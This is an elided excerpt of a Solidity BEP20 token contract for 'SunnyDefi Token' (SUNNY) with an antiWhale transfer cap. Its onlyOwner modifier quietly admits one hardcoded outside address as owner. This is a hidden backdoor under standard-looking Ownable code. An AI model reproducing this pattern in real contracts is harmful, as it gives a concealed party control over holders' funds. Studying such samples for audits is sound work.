...
contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender() == 0x484b5e25d9FeB5C0df6760a95F754FB8844180d1, 'Ownable: caller is not the owner');
        _;
    }
...
// File: contracts/libs/LibBEP20.sol
 ...
 */
contract LibBEP20 is Context, Ownable {
...
contract CakeToken is LibBEP20 {
    ...
    modifier antiWhale(address sender, address recipient, uint256 amount) {
        if (
            ...
            require(amount <= maxTransferAmount(), "SUNNY::antiWhale: Transfer amount exceeds the maxTransferAmount");
        }
        _;
    }

    constructor() public LibBEP20("SunnyDefi Token", "SUNNY") {
    ...
    function updateMaxTransferAmountRate(uint16 _maxTransferAmountRate) public onlyOperator {
        require(_maxTransferAmountRate <= 10000, "SUNNY::updateMaxTransferAmountRate: Max transfer amount rate must not exceed the maximum rate.");
